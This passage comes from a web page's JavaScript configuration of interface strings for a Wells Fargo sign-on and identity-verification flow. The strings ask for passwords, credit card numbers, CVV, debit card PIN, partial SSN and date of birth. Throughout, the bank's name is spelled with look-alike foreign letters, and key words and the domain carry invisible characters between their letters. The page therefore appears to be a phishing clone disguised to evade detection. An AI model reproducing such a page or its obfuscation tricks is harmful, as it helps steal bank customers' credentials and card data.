notification)\x22,\x22core.interdiction.select.push\x22:\x22Mobile\/tablet notifications\x22,\x22FAILURE\x22:\x22We\x27re sorry. This service is temporarily unavailable. Please try again later.\x22,\x22core.interdiction.ocs.accessCodeHelp\x22:\x22<ol><li>You requested a code from customer service. If you have not received a code, please call 1\-866\-609\-3037 for assistance.<\/li><\/ol>\x22,\x22core.interdiction.submitCode\x22:\x22Submit Code\x22,\x22core.interdiction.auth.expiryDate.placeHolder\x22:\x22mm\/yy\x22,\x22core.interdiction.auth.label.phoneType.HOME\x22:\x22Home<span style=\\\x22display:none\\\x22>:<\/span>\x22,\x22core.interdiction.auth.label.phoneType.WORK\x22:\x22Work<span style=\\\x22display:none\\\x22>:<\/span>\x22,\x22core.interdiction.auth.label.phoneType.MOBILE\x22:\x22Mobile<span style=\\\x22display:none\\\x22>:<\/span>\x22,\x22core.interdiction.auth.label.phoneType.OTHER\x22:\x22Other<span style=\\\x22display:none\\\x22>:<\/span>\x22,\x22core.interdiction.auth.label.error.oow.pleaseselectatleastonechoice\x22:\x22Please select an answer from the choices shown to continue.\x22,\x22core.interdiction.auth.label.error.oow.failedToAnswerQuestions\x22:\x22<p>We are unable to complete your request. Please call us at 1\-866\-609\-3037 to confirm your identity.<\/p><p>If you\x27re a guest user, please have your administrator contact us at {1}.<\/p><p>Thank you for helping us keep your account safe.<\/p>\x22,\x22core.interdiction.auth.label.error.oow.questionnaireerror\x22:\x22System is down. Please try after sometime.\x22,\x22core.interdiction.auth.label.error.oow.sorDown\x22:\x22We\x27re sorry. This service is temporarily unavailable. Please try again later.\x22,\x22core.interdiction.auth.title.letsVerifyYourIdentity\x22:\x22Let\x27s Verify Your Identity\x22,\x22core.interdiction.auth.advancedAccessIntroduction.forYourSecurity\x22:\x22For your security, let\x27s verify who you are by choosing a \x22,\x22core.interdiction.auth.advancedAccessIntroduction.identityVerification\x22:\x22verification option\x22,\x22core.interdiction.auth.advancedAccessIntroduction.below\x22:\x22 below.\x22,\x22core.interdiction.auth.advancedAccessIntroduction.verbalOTP\x22:\x22For your security, let\x27s verify who you are by calling us for a verification code.\x22,\x22core.interdiction.auth.advancedAccessAdditionalInstructions\x22:\x22<p>Recent updates to your contact information may not be immediately available for selection.<\/p><p>Please select a verification method.<\/p>\x22,\x22core.interdiction.auth.fobViewBean.label\x22:\x22Enter code from my RSA SecurID<sup>\x26reg;<\/sup>\x22,\x22core.interdiction.auth.ocsOTPViewBean.label\x22:\x22Call us for a code\x22,\x22core.interdiction.auth.pushOTPViewBean.label\x22:\x22Send me a push notification\x22,\x22core.interdiction.auth.e‎‏m‎‏a‎‏i‎‏l‎‏OTPViewBean.label\x22:\x22Send me an e‎‏m‎‏a‎‏i‎‏l‎‏\x22,\x22core.interdiction.auth.callOTPViewBean.label\x22:\x22Call me with a code\x22,\x22core.interdiction.auth.textOTPViewBean.label\x22:\x22Text me a code\x22,\x22core.interdiction.auth.cvvViewBean.label\x22:\x22Enter my Сrеԁit Саrԁ information\x22,\x22core.interdiction.auth.pinViewBean.label\x22:\x22Enter my debit\/ATM C‎‏a‎‏r‎‏d‎‏ PIN\x22,\x22core.interdiction.auth.oowAvailable.label\x22:\x22Answer security questions\x22,\x22core.interdiction.auth.oow.landing\x22:\x22For your security, let\x27s verify who you are by answering a few questions.\x22,\x22core.interdiction.auth.help.receiveCode\x22:\x22<p>You may not receive your code immediately. Please allow a few minutes for delivery.<\/p><p>If you didn\x27t receive your code, please verify:<\/p>\x22,\x22core.interdiction.auth.help.requestByPhone\x22:\x22Your phone is on, has coverage based on your current location, and is ready to receive messages.\x22,\x22core.interdiction.auth.help.requestByPush\x22:\x22You have your device set to receive push notifications.\x22,\x22core.interdiction.auth.help.requestBye‎‏m‎‏a‎‏i‎‏l‎‏\x22:\x22You\x27ve checked your spam or junk folder for the e‎‏m‎‏a‎‏i‎‏l‎‏ you requested.\x22,\x22core.interdiction.auth.help.verifiedContactInfo\x22:\x22You\x27ve verified that your contact information is correct.\x22,\x22core.interdiction.auth.help.codeNotReceived\x22:\x22If you didn\x27t receive your code or if the code you received has expired, you can \x22,\x22core.interdiction.auth.help.requestNewCode\x22:\x22request a new code.\x22,\x22core.interdiction.auth.label.authCodeSentByPhone\x22:\x22Your code was sent to {phDisplayNumber} by phone call. Enter your code as soon as you receive it.\x22,\x22core.interdiction.auth.label.authCodeSentByText\x22:\x22Your code was sent to {phDisplayNumber} by text message. Enter your code as soon as you receive it.\x22,\x22core.interdiction.auth.label.authCodeSentBye‎‏m‎‏a‎‏i‎‏l‎‏\x22:\x22Your code was sent to {e‎‏m‎‏a‎‏i‎‏l‎‏Address} by e‎‏m‎‏a‎‏i‎‏l‎‏. Enter your code as soon as you receive it.\x22,\x22core.interdiction.auth.label.authCodeSentByPush\x22:\x22Your code was sent to your mobile device or tablet by push notification. Enter your code as soon as you receive it.\x22,\x22core.interdiction.auth.label.authCodeResentByPhone\x22:\x22We\x27ve sent a new code to {phDisplayNumber} by phone call. Enter your code as soon as you receive it.\x22,\x22core.interdiction.auth.label.authCodeResentByText\x22:\x22We\x27ve sent a new code to {phDisplayNumber} by text message. Enter your code as soon as you receive it.\x22,\x22core.interdiction.auth.label.authCodeResentBye‎‏m‎‏a‎‏i‎‏l‎‏\x22:\x22We\x27ve sent a new code to {e‎‏m‎‏a‎‏i‎‏l‎‏Address} by e‎‏m‎‏a‎‏i‎‏l‎‏. Enter your code as soon as you receive it.\x22,\x22core.interdiction.auth.label.authCodeResentByPush\x22:\x22We\x27ve sent a new code to your mobile device or tablet by push notification. Enter your code as soon as you receive it.\x22,\x22core.interdiction.auth.messageDelivery.title\x22:\x22Message Delivery Agreement\x22,\x22core.interdiction.auth.pushDelivery.title\x22:\x22Push Notice and Delivery Agreement\x22,\x22core.interdiction.auth.messageDelivery.consentIntro.single\x22:\x22Your code will be sent to {displayContent}.\x22,\x22core.interdiction.auth.messageDelivery.consentIntro\x22:\x22Your code will be sent to {displayContent} or you can \x22,\x22core.interdiction.auth.messageDelivery.consentIntro.chooseAnother.e‎‏m‎‏a‎‏i‎‏l‎‏\x22:\x22Choose Another e‎‏m‎‏a‎‏i‎‏l‎‏\x22,\x22core.interdiction.auth.messageDelivery.consentIntro.chooseAnother.number\x22:\x22Choose Another Number\x22,\x22core.interdiction.auth.messageDelivery.disclosure\x22:\x22By selecting <strong>Get Code<\/strong>, you agree WеІІѕ Fаrɡο may deliver a one\-time verification code to you using the delivery method above.\x22,\x22core.interdiction.auth.messageDelivery.consent.call\x22:\x22You also agree WеІІѕ Fаrɡο may send the code using an autodialer or artificial or prerecorded voice message to the phone number displayed.\x22,\x22core.interdiction.auth.messageDelivery.consent\x22:\x22Your mobile carrier\x27s message and data rates may apply.\x22,\x22core.interdiction.auth.ocsEnabled.header\x22:\x22Call Us for a Code\x22,\x22core.interdiction.auth.ocsDisabled.header\x22:\x22Call Us for Assistance\x22,\x22core.interdiction.auth.label.accessCode\x22:\x22Access code\x22,\x22core.interdiction.auth.label.deviceCode\x22:\x22Device code\x22,\x22core.interdiction.auth.enterCode\x22:\x22Enter code\x22,\x22core.interdiction.auth.title.enterCode\x22:\x22Enter Code\x22,\x22core.interdiction.auth.placeholder.enterCode\x22:\x22Enter code\x22,\x22core.interdiction.auth.selectNumberIntro\x22:\x22Select a number for receiving your code.\x22,\x22core.interdiction.auth.selecte‎‏m‎‏a‎‏i‎‏l‎‏Intro\x22:\x22Select an e‎‏m‎‏a‎‏i‎‏l‎‏ address for receiving your code.\x22,\x22core.interdiction.auth.selectNumber.notAvailable\x22:\x22 (Not Available)\x22,\x22core.interdiction.auth.selectNumber.notAvailable.findOutWhy\x22:\x22Find out why?\x22,\x22core.interdiction.auth.header.selectPhoneNumber\x22:\x22Select Your Phone Number\x22,\x22core.interdiction.auth.header.selecte‎‏m‎‏a‎‏i‎‏l‎‏\x22:\x22Select Your e‎‏m‎‏a‎‏i‎‏l‎‏\x22,\x22core.interdiction.auth.label.fobCodeEntry\x22:\x22Enter code from your RSA SecurID<span class=\\\x22visuallyHidden\\\x22>Footnote <\/span><sup>\x26reg; 1<\/sup> device.\x22,\x22core.interdiction.auth.label.secureID\x22:\x22<span class=\\\x22visuallyHidden\\\x22>Footnote <\/span><sup>1<\/sup> SecurID<sup>\x26reg;<\/sup> is a registered trademark of RSA Security, Inc.\x22,\x22core.interdiction.auth.button.label.tryAnotherMethod\x22:\x22Try Another Method\x22,\x22core.interdiction.auth.button.label.sendCode\x22:\x22Send Code\x22,\x22core.interdiction.auth.title.identityVerification\x22:\x22Identity Verification\x22,\x22core.interdiction.auth.title.oow\x22:\x22Answer Security Questions\x22,\x22core.interdiction.auth.findCVV\x22:\x22Find your CVV\x22,\x22core.interdiction.auth.title.findCVV\x22:\x22Find the Security Code on Your C‎‏a‎‏r‎‏d‎‏\x22,\x22core.interdiction.auth.title.C‎‏r‎‏e‎‏d‎‏i‎‏t‎‏C‎‏a‎‏r‎‏d‎‏\x22:\x22Сrеԁit Саrԁ\x22,\x22core.interdiction.auth.label.C‎‏r‎‏e‎‏d‎‏i‎‏t‎‏C‎‏a‎‏r‎‏d‎‏Number\x22:\x22Сrеԁit Саrԁ Number\x22,\x22core.interdiction.auth.label.expirationDate\x22:\x22Expiration date\x22,\x22core.interdiction.auth.label.cvv\x22:\x22CVV\x22,\x22core.interdiction.auth.title.debitATMC‎‏a‎‏r‎‏d‎‏\x22:\x22Debit\/ATM C‎‏a‎‏r‎‏d‎‏\x22,\x22core.interdiction.auth.subtitle.debitATMC‎‏a‎‏r‎‏d‎‏\x22:\x22Enter your WеІІѕ Fаrɡο Debit\/ATM C‎‏a‎‏r‎‏d‎‏ PIN using the keypad.\x22,\x22core.interdiction.auth.label.PIN\x22:\x22PIN\x22,\x22core.interdiction.auth.placeholder.enterPIN\x22:\x22Enter PIN\x22,\x22core.interdiction.auth.label.authCodeSentByOCS\x22:\x22Our Customer Service team has provided your code to you. Enter your code as soon as you receive it.\x22,\x22core.interdiction.auth.numbersUnavailable.title\x22:\x22Why Phone Numbers are Unavailable\x22,\x22core.interdiction.auth.pushNotificationMessage\x22:\x22To receive push notifications on your mobile device, the <i>WеІІѕ Fаrɡο mobile<sup>\x26reg;<\/sup><\/i> app on your phone or tablet must be set to allow notifications.\x22,\x22core.interdiction.auth.enterC‎‏r‎‏e‎‏d‎‏i‎‏t‎‏C‎‏a‎‏r‎‏d‎‏Information\x22:\x22Enter your WеІІѕ Fаrɡο Сrеԁit Саrԁ information.\x22,\x22core.interdiction.auth.findCVVContent1\x22:\x22<h3>C‎‏a‎‏r‎‏d‎‏s with MasterC‎‏a‎‏r‎‏d‎‏ or Visa logo<\/h3><p>Look for a 3\-digit security code on the back of the C‎‏a‎‏r‎‏d‎‏.<\/p>\x22,\x22core.interdiction.auth.findCVVContent2\x22:\x22<h3>American Express<\/h3><p>Look on the front for the 4\-digit security code.<\/p>\x22,\x22core.interdiction.auth.findCVVContent3\x22:\x22<p>American Express is a federally registered service mark of American Express. The C‎‏a‎‏r‎‏d‎‏ is issued by WеІІѕ Fаrɡο B‎‏a‎‏n‎‏k‎‏, N.A. pursuant to a license from American Express.<\/p>\x22,\x22core.interdiction.auth.title.AA_AUTH_LOCKED\x22:\x22Contact Us for Assistance\x22,\x22core.interdiction.auth.title.accessIsBlocked\x22:\x22Access is Blocked\x22,\x22core.interdiction.auth.title.contactUsForAssistance\x22:\x22Contact Us for Assistance\x22,\x22core.interdiction.auth.title.contactUsForAccess\x22:\x22Contact Us for Access\x22,\x22core.interdiction.auth.title.systemIsUnavailable\x22:\x22System is Unavailable\x22,\x22core.interdiction.auth.AA_OTP_CODE_DELIVERY_ERROR.SMS\x22:\x22We\x27re unable to deliver your Advanced Access code by text. Please confirm the number and try again or select <strong>Try Another Method<\/strong>.\x22,\x22core.interdiction.auth.AA_OTP_CODE_DELIVERY_ERROR.VRU\x22:\x22We\x27re unable to deliver your Advanced Access code by phone. Please confirm the number and try again or select <strong>Try Another Method<\/strong>.\x22,\x22core.interdiction.auth.AA_OTP_CODE_DELIVERY_ERROR.e‎‏m‎‏a‎‏i‎‏l‎‏\x22:\x22We\x27re unable to deliver your Advanced Access code by e‎‏m‎‏a‎‏i‎‏l‎‏. Please confirm your e‎‏m‎‏a‎‏i‎‏l‎‏ address is correct and try again or select <strong>Try Another Method<\/strong>.\x22,\x22core.interdiction.auth.AA_AUTH_LOCKED\x22:\x22We can\x27t complete your online request right now, but we may be able to verify your identity by phone at {csNumber}. If you\x27re a guest user, please have your administrator call us.\x22,\x22core.interdiction.auth.AUTH_DISABLED\x22:\x22We can\x27t complete your online request right now, but we may be able to verify your identity by phone at {csNumber}. If you\x27re a guest user, please have your administrator call us.\x22,\x22core.interdiction.auth.AA_VERIFY_LOCKED\x22:\x22We can\x27t complete your online request right now, but we may be able to verify your identity by phone at {csNumber}. If you\x27re a guest user, please have your administrator call us.\x22,\x22core.interdiction.auth.INVALID_DATA\x22:\x22We\x27re sorry. This service is temporarily unavailable. Please try again later.\x22,\x22core.interdiction.auth.SYSTEM\x22:\x22We\x27re sorry. This service is temporarily unavailable. Please try again later.\x22,\x22core.interdiction.auth.SYSTEM_DOWN\x22:\x22We\x27re sorry. This service is temporarily unavailable. Please try again later.\x22,\x22core.interdiction.auth.SYSTEM_ERROR\x22:\x22We\x27re sorry. This service is temporarily unavailable. Please try again later.\x22,\x22core.interdiction.auth.AUTH_FAILED\x22:\x22The code you\x27ve entered isn\x27t correct. Please wait for your RSA SecurID<sup>\x26reg;<\/sup> device to show a new 6\-digit code and try again.\x22,\x22core.interdiction.auth.AUTH_SYSTEM_DOWN\x22:\x22We\x27re sorry. This service is temporarily unavailable. Please try again later.\x22,\x22core.interdiction.auth.VALIDATION_FAILURE\x22:\x22Your code is invalid. Please try again.\x22,\x22core.interdiction.auth.EXPIRED\x22:\x22Your code is invalid. Please try again.\x22,\x22core.interdiction.auth.FAILED\x22:\x22Your code is invalid. Please try again.\x22,\x22core.interdiction.auth.NOT_FOUND\x22:\x22We\x27re sorry. This service is temporarily unavailable. Please try again later.\x22,\x22core.interdiction.auth.VALIDATION_FAILED_OR_EXPIRED\x22:\x22Validation Failed Or Expired\x22,\x22core.interdiction.auth.NO_MATCH\x22:\x22We\x27re unable to verify your entry. Please try again.\x22,\x22core.interdiction.auth.INPUT_VALIDATION\x22:\x22We\x27re unable to verify your entry. Please try again.\x22,\x22core.interdiction.auth.ACCOUNT_BLOCKED\x22:\x22We\x27re unable to process your request online. Please call us at 1\-800\-956\-4442 for help.\x22,\x22core.interdiction.auth.BLOCK\x22:\x22We\x27re unable to process your request online. Please call us at 1\-866\-609\-3037 for help.\x22,\x22core.interdiction.auth.CVC_MAX_VIOLATION\x22:\x22We\x27re unable to process your request online. Please call us at 1\-800\-956\-4442 for help.\x22,\x22core.interdiction.auth.CUSTOMER_NOT_FOUND\x22:\x22We\x27re sorry. We\x27re unable to confirm your identity or complete your request at this time. Please call us at {oowPhoneNumber} for help.\x22,\x22core.interdiction.auth.INVALID_DATA_CVV\x22:\x22We\x27re unable to verify your entry. Please try again.\x22,\x22core.interdiction.auth.INVALID_DATA_PIN\x22:\x22We\x27re unable to verify your entry. Please try again.\x22,\x22core.interdiction.auth.CVC_NOT_MATCHED\x22:\x22We\x27re unable to verify your entry. Please try again.\x22,\x22core.interdiction.auth.INPUT_VALIDATION_CC_NUMBER_NOT_PROVIDED\x22:\x22We\x27re unable to verify your entry. Please try again.\x22,\x22core.interdiction.auth.INPUT_VALIDATION_CC_AMEX_CSC_NOT_PROVIDED\x22:\x22We\x27re unable to verify your entry. Please try again.\x22,\x22core.interdiction.auth.INPUT_VALIDATION_EXPIRATION_DATE_NOT_PROVIDED\x22:\x22We\x27re unable to verify your entry. Please try again.\x22,\x22core.interdiction.auth.PII_LOCKED\x22:\x22We\x27ve temporarily suspended your online access. Please call the customer service number on the original e‎‏m‎‏a‎‏i‎‏l‎‏ you received and verify your information with the agent. After 24 hours, you\x27ll be able to log on again.\x22,\x22core.interdiction.auth.title.piiLocked\x22:\x22Access Suspended\x22,\x22core.interdiction.auth.piiIntroduction\x22:\x22For your security, we need a bit more information.\x22,\x22core.interdiction.auth.piiViewBean.label\x22:\x22Confirm my personal information\x22,\x22core.interdiction.auth.title.pii\x22:\x22Tell Us About Yourself\x22,\x22core.interdiction.auth.subject.pii\x22:\x22We\x27ll need some basic information to make sure it\x27s you.\x22,\x22core.interdiction.auth.label.ssn\x22:\x22Last 4 digits of your <abbr title=\\\x22Social Security number\\\x22>SSN<\/abbr> or <abbr title=\\\x22Individual Taxpayer Identification Number\\\x22>ITIN<\/abbr>\x22,\x22core.interdiction.auth.label.lastName\x22:\x22Last name\x22,\x22core.interdiction.auth.label.dob\x22:\x22Date of birth\x22,\x22core.interdiction.auth.supportingtext.dob\x22:\x22MM\/DD\/YYYY\x22,\x22core.interdiction.auth.exit\x22:\x22Exit\x22,\x22pagination.first\x22:\x22First\x22,\x22pagination.previous\x22:\x22Previous\x22,\x22pagination.next\x22:\x22Next\x22,\x22cms.disclosures\x22:\x22Disclosures\x22,\x22cms.footnotes\x22:\x22Important Information and Footnotes\x22,\x22cms.print\x22:\x22Print this page\x22,\x22cms\-error\-message\x22:\x22We\x27re sorry. This service is temporarily unavailable. Please try again later.\x22,\x22cms.mojo.error.header\x22:\x22We\x27re sorry.\x22,\x22cms.mojo.error.header.variant\x22:\x22Error\x22,\x22cms.mojo.error.button\x22:\x22OK\x22,\x22cms.mojo.error.message\x22:\x22We are currently unable to process your request. Please try again later.\x22,\x22upload.add.document\x22:\x22Add document\x22,\x22upload.add.another.item\x22:\x22Add another item\x22,\x22upload.drag.files\x22:\x22 or drag files into the box\x22,\x22upload.invalid.file.error\x22:\x22We are unable to accept this file type. Please try again after saving your file as one of our accepted types:<br\/>PDF documents<br\/>Images (PNG, JPEG, GIF, TIFF, BMP)<br\/>Files with any of these extensions: .bmp; .gif; .jpeg; .jpg; .pdf; .tif; .tiff\x22,\x22upload.spinner.default.text\x22:\x22Please wait\x22,\x22upload.spinner.upload.text\x22:\x22Uploading your documents\x22,\x22upload.file.unaccepted\x22:\x22Unaccepted file\x22,\x22INDIVIDUAL_FILE_SIZE_EXCEEDED\x22:\x22This document exceeds our file size limit of {value} megabytes. Please reduce the size of the document, and try again.\x22,\x22INVALID_FILE_EXTENSION\x22:\x22Please rename your file so the extension matches the document type, and then try your upload again.\x22,\x22VIRUS_SCAN_FAILED\x22:\x22We have detected a virus in one or more of your uploaded documents. Please review your files and try again.\x22,\x22PASSWORD_PROTECTED_FILE\x22:\x22The document you submitted is encrypted or has been password protected. Please remove the encryption or password protection, and try again.\x22,\x22TOTAL_FILE_SIZE_EXCEEDED\x22:\x22Your documents exceed our file size limit of {value} megabytes per upload.  Please reduce the size of the documents, and try again.\x22,\x22FILE_COUNT_LIMIT_EXCEEDED\x22:\x22We cannot upload this file. You have already reached the maximum number of files ({value}) allowed for upload.\x22,\x22FILE_SMALLER_THAN_MIN_SIZE\x22:\x22This document doesn\x27t meet our minimum file size of {value} kilobyte.  Please increase the size of the document, and try again.\x22,\x22GENERIC_ERROR\x22:\x22An error occurred when one or more of your documents were uploading.\x22,\x22DEVICE_NOT_ALLOWED_FOR_UPLOAD\x22:\x22This device is not supported for upload.  Please s‎‏i‎‏g‎‏n‎‏ o‎‏n‎ from a supported device to upload documents.\x22,\x22global.wf.leave.title\x22:\x22Leaving WеІІѕ Fаrɡο\x22,\x22global.wf.leave.confirm.one\x22:\x22The link you have selected will bring you to a web site not affiliated with WеІІѕ Fаrɡο. If you continue without signing off, your session will remain active until it times out.\x22,\x22global.wf.leave.confirm.two\x22:\x22WеІІѕ Fаrɡο has provided this link for your convenience, but does not endorse and is not responsible for the content, links, privacy policy, or security policy of this website.\x22,\x22global.last.logon\x22:\x22<span>Your last s‎‏i‎‏g‎‏n‎‏ o‎‏n‎ was<\/span><span>{logonMonth} {logonDate}, {logonYear} at<\/span><span>{logonTime} {logonTimezone}<\/span>\x22,\x22global.rights.reserved\x22:\x22All rights reserved\x22,\x22global.loading\x22:\x22Loading\x22,\x22global.profile.menu\x22:\x22Profile Menu\x22,\x22global.service.unavailable\x22:\x22The service you requested is temporarily unavailable. Please try again later.\x22,\x22global.system.unavailable.heading\x22:\x22System Unavailable\x22,\x22global.information\x22:\x22Information\x22,\x22global.welcome\x22:\x22Welcome\x22,\x22global.skip.to.navigation\x22:\x22Skip to bottom bar\x22,\x22global.registered.sign\x22:\x22registered sign\x22,\x22carousel.item\x22:\x22Item {item}\x22,\x22carousel.current\x22:\x22Current\x22,\x22carousel.indicator.label\x22:\x22<strong>{currentPanel}<\/strong> of <strong>{panelCount}<\/strong>\x22,\x22carousel.indicator.label.light\x22:\x22{a11yLabel} {currentPanel} of {panelCount}\x22,\x22carouselButton.next\x22:\x22Next Slide\x22,\x22carouselButton.previous\x22:\x22Previous Slide\x22,\x22globalSearch.results.header\x22:\x22Search Results\x22,\x22globalSearch.results.searchPrefix\x22:\x22If you didn\x27t find what you\x27re looking for, try the\x22,\x22globalSearch.results.searchLink\x22:\x22 search results from our public website. \x22,\x22globalSearch.results.searchSuffix\x22:\x22Note: you will be leaving your secure b‏a‎‏n‎‏k‎‏ing session.\x22,\x22globalSearch.results.noResultsSearchPrefix\x22:\x22You may find what you\x27re looking for in the\x22,\x22globalSearch.results.noResults\x22:\x22We didn\x27t find any results for <strong>{lastSearchedValue}<\/strong>.\x22,\x22globalSearch.results.tips.header\x22:\x22Try using these search tips:\x22,\x22globalSearch.results.tip1\x22:\x22Check for incorrect spelling\x22,\x22globalSearch.results.tip2\x22:\x22Use different keywords\x22,\x22globalSearch.results.tip3\x22:\x22Ask a question, such as \\\x22How can I transfer money to another account?\\\x22 or \\\x22How do I reorder checks?\\\x22\x22,\x22globalSearch.results.spellings.include\x22:\x22Including results for \x22,\x22globalSearch.results.spellings.show\x22:\x22Show results for \x22,\x22globalSearch.suggestions\x22:\x22suggestions.\x22,\x22globalSearch.search\x22:\x22Search\x22,\x22globalSearch.opensDialog\x22:\x22Search \- Opens a dialog.\x22,\x22globalSearch.closeSearchDialog\x22:\x22Close search dialog\x22,\x22globalSearch.input\x22:\x22Enter search term then use up and down arrows to browse suggestions.\x22,\x22globalSearch.beginsDialog\x22:\x22Begins dialog\x22,\x22globalSearch.endsDialog\x22:\x22Ends dialog\x22,\x22globalSearch.system.unavailable\x22:\x22External system temporarily not available. Please try again later.\x22,\x22stickyfooter.home\x22:\x22Accounts\x22,\x22stickyfooter.transfer\x22:\x22Transfer\x22,\x22stickyfooter.zelle\x22:\x22Zelle\x22,\x22stickyfooter.deposits\x22:\x22Deposits\x22,\x22stickyfooter.more\x22:\x22More\x22,\x22stickyfooter.nav.label\x22:\x22bottom bar\x22,\x22stickyfooter.link.selected\x22:\x22Selected\x22,\x22stickyfooter.link.of\x22:\x22of\x22,\x22loginApp.login.salutationMorningTitle\x22:\x22Good morning\x22,\x22loginApp.login.salutationAfternoonTitle\x22:\x22Good afternoon\x22,\x22loginApp.login.salutationEveningTitle\x22:\x22Good evening\x22,\x22loginApp.login.signOnMessage\x22:\x22s‎‏i‎‏g‎‏n‎‏ o‎‏n‎ to manage your accounts\x22,\x22loginApp.login.label.Username\x22:\x22Username\x22,\x22loginApp.login.button.signOn\x22:\x22s‎‏i‎‏g‎‏n‎‏ o‎‏n‎\x22,\x22loginApp.login.checkboxLabel.saveUsername\x22:\x22Save username\x22,\x22loginApp.login.inputLabel.password\x22:\x22Password\x22,\x22loginApp.login.inputLabel.username\x22:\x22Username\x22,\x22loginApp.login.label.needHelp\x22:\x22Need help?\x22,\x22loginApp.login.label.createANewPassword\x22:\x22Create a new password\x22,\x22loginApp.login.label.findYourUsername\x22:\x22find your username\x22,\x22loginApp.login.label.or\x22:\x22or\x22,\x22loginApp.login.toolTipHeader\x22:\x22Save username\x22,\x22loginApp.login.toolTipContent\x22:\x22We don\x27t recommend saving your username if you\x27re on a shared device.\x22,\x22loginApp.login.captchaPlaceholder.visualChallenge\x22:\x22Enter the characters you see\x22,\x22loginApp.login.captchaPlaceholder.audioChallenge\x22:\x22Enter the characters you hear\x22,\x22loginApp.login.captchaPlaceholder.verboseLabel\x22:\x22Help us make sure you\x27re a person\x22,\x22loginApp.login.captchaPlaceholder.answerInputLabel\x22:\x22Enter the characters\x22,\x22loginApp.login.pageTitle\x22:\x22s‎‏i‎‏g‎‏n‎‏ o‎‏n‎ to View Your Personal Accounts | WеІІѕ Fаrɡο\x22}%w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏Proprietary*\/';
		window.mwfGlobals.embeddedFragments = '/*w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏Proprietary%""%w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏Proprietary*/';
		window.mwfGlobals.targetUrl = '';
		window.mwfGlobals.menuContext = {menuConfig: '\/*w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏Proprietary%{\x22containers\x22:[{\x22name\x22:\x22MASTHEAD_NAV\x22,\x22sections\x22:[{\x22name\x22:\x22MAIN\x22,\x22links\x22:[{\x22icon\x22:\x22LOGO\x22,\x22navigationId\x22:\x22WF_LOGO\x22,\x22type\x22:\x22browser\x22,\x22url\x22:\x22https:\/\/www.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/\x22},{\x22label\x22:\x22Enroll\x22,\x22navigationId\x22:\x22ENROLL\x22,\x22style\x22:\x22\x22,\x22type\x22:\x22browser\x22,\x22url\x22:\x22https:\/\/oam.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/oamo\/identity\/enrollment\x22},{\x22label\x22:\x22Customer Service\x22,\x22navigationId\x22:\x22CUSTOMER_SERVICE\x22,\x22style\x22:\x22\x22,\x22type\x22:\x22browser\x22,\x22url\x22:\x22https:\/\/www.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/help\/\x22},{\x22label\x22:\x22ATMs\/Locations\x22,\x22navigationId\x22:\x22ATMS_LOCATIONS\x22,\x22style\x22:\x22\x22,\x22type\x22:\x22browser\x22,\x22url\x22:\x22https:\/\/www.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/locator\/\x22},{\x22label\x22:\x22Español\x22,\x22navigationId\x22:\x22LANGUAGE_PREFERENCE\x22,\x22style\x22:\x22\x22,\x22type\x22:\x22browser\x22,\x22url\x22:\x22\/auth\/login\/present?origin=cob\x26langPref=SPN\x22}],\x22type\x22:\x22LINKS\x22}]},{\x22name\x22:\x22HAMBURGER_MENU\x22,\x22sections\x22:[{\x22links\x22:[{\x22label\x22:\x22Search\x22,\x22navigationId\x22:\x22SEARCH\x22,\x22style\x22:\x22\x22,\x22type\x22:\x22browser\x22,\x22url\x22:\x22https:\/\/www.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/search\/search?q=\x22},{\x22label\x22:\x22Enroll\x22,\x22navigationId\x22:\x22ENROLL\x22,\x22style\x22:\x22\x22,\x22type\x22:\x22browser\x22,\x22url\x22:\x22https:\/\/oam.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/oamo\/identity\/enrollment\x22},{\x22label\x22:\x22Customer Service\x22,\x22navigationId\x22:\x22CUSTOMER_SERVICE\x22,\x22style\x22:\x22\x22,\x22type\x22:\x22browser\x22,\x22url\x22:\x22https:\/\/www.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/help\/\x22},{\x22label\x22:\x22ATMs\/Locations\x22,\x22navigationId\x22:\x22ATMS_LOCATIONS\x22,\x22style\x22:\x22\x22,\x22type\x22:\x22browser\x22,\x22url\x22:\x22https:\/\/www.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/locator\/\x22},{\x22label\x22:\x22Español\x22,\x22navigationId\x22:\x22LANGUAGE_PREFERENCE\x22,\x22style\x22:\x22\x22,\x22type\x22:\x22browser\x22,\x22url\x22:\x22\/auth\/login\/present?origin=cob\x26langPref=SPN\x22},{\x22label\x22:\x22Home\x22,\x22navigationId\x22:\x22HOME\x22,\x22style\x22:\x22\x22,\x22type\x22:\x22browser\x22,\x22url\x22:\x22https:\/\/www.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/\x22}],\x22type\x22:\x22LINKS\x22}]},{\x22name\x22:\x22FOOTER\x22,\x22sections\x22:[{\x22links\x22:[{\x22eid\x22:\x22\x22,\x22label\x22:\x22About WеІІѕ Fаrɡο\x22,\x22navigationId\x22:\x22ABOUT_WELLS_FARGO\x22,\x22type\x22:\x22browser\x22,\x22url\x22:\x22https:\/\/www.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/about\/\x22},{\x22eid\x22:\x22\x22,\x22label\x22:\x22Online Access Agreement\x22,\x22navigationId\x22:\x22ONLINE_ACCESS_AGREEMENT\x22,\x22type\x22:\x22browser\x22,\x22url\x22:\x22https:\/\/www.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/online\-b‏a‎‏n‎‏k‎‏ing\/online\-access\-agreement\/\x22},{\x22eid\x22:\x22\x22,\x22label\x22:\x22Privacy, Cookies, Security \x26 